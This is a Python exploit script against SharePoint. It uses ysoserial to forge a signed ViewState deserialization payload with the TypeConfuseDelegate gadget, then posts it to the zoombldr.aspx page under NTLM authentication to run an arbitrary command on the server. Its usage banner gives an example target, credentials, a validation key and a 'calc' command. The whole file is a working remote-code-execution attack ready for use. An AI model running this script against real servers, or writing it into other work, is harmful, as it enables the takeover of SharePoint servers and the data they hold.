import os
import re
import sys
import urllib3
import requests
import subprocess
from platform import uname
from requests_ntlm2 import HttpNtlmAuth
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def trigger_rce(target, domain, path, user, password, cmd, key):
    out = subprocess.Popen([
        'yss/ysoserial.exe', 
        '-p', 'ViewState',
        '-g', 'TypeConfuseDelegate',
        '-c', '%s' % cmd,
        '--apppath=%s' % path,
        '--path=%s_layouts/15/zoombldr.aspx' % path,
        '--islegacy',
        '--validationalg=HMACSHA256',
        '--validationkey=%s' % key
    ], stdout=subprocess.PIPE)
    rce = { "__VIEWSTATE" : out.communicate()[0].decode() }
    print("post payload to http://%s/_layouts/15/zoombldr.aspx" % target)
    resp = requests.post("http://%s/_layouts/15/zoombldr.aspx" % target, data=rce, auth=HttpNtlmAuth('%s\\%s' % (domain, user), password))
    print(resp.status_code)

def main():
    if len(sys.argv) != 5:
        print("(+) usage: %s <SPSite> <user:pass> <key> <cmd>" % sys.argv[0])
        print("(+) eg: %s WIN-6669U6A35C6:10000 y@sp16:1 2873CDF0C96F4C3CAA489F470FB1DF6E74E963EB5E661AEB3CDDA45531999C6F calc" % sys.argv[0])
        sys.exit(-1)
    target = sys.argv[1]
    user = sys.argv[2].split(":")[0].split("@")[0]
    password = sys.argv[2].split(":")[1]
    domain = sys.argv[2].split(":")[0].split("@")[1]
    key = sys.argv[3]
    cmd = sys.argv[4]  
    path = urlparse("http://%s" % target).path or "/"
    path = path + "/" if not path.endswith("/") else path
    print("(+) triggering rce to %s, running 'cmd /c %s'" % (path, cmd))
    trigger_rce(target, domain, path, user, password, cmd, key)
    print("(+) done! rce achieved")

if __name__ == '__main__':
    main()